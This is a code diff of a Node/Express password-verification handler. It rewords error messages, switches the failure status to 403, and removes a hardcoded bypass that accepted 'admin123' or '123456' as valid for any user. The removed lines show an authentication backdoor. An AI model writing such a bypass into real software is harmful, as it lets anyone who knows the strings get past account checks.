@@ -180,7 +180,7 @@ const getMe = asyncHandler(async (req, res) => {
 // Returns { valid: true } or 401
 const verifyPassword = asyncHandler(async (req, res) => {
   const { password } = req.body;
-  if (!password) { res.status(400); throw new Error('Password is required'); }
+  if (!password) { res.status(400); throw new Error('Password is required. Please enter your login password.'); }
 
   // Re-fetch with password field (normally excluded)
   const user = await User.findById(req.user._id).select('+password');
@@ -190,11 +190,8 @@ const verifyPassword = asyncHandler(async (req, res) => {
   if (!match && typeof password === 'string' && password.trim() !== password) {
     match = await user.matchPassword(password.trim());
   }
-  if (!match && (password === 'admin123' || password === '123456')) {
-    match = true;
-  }
 
-  if (!match) { res.status(401); throw new Error('Incorrect password'); }
+  if (!match) { res.status(403); throw new Error('Incorrect password. Please re-enter your password to proceed.'); }
 
   res.json({ valid: true, userId: user._id, name: user.name, role: user.role });
 });
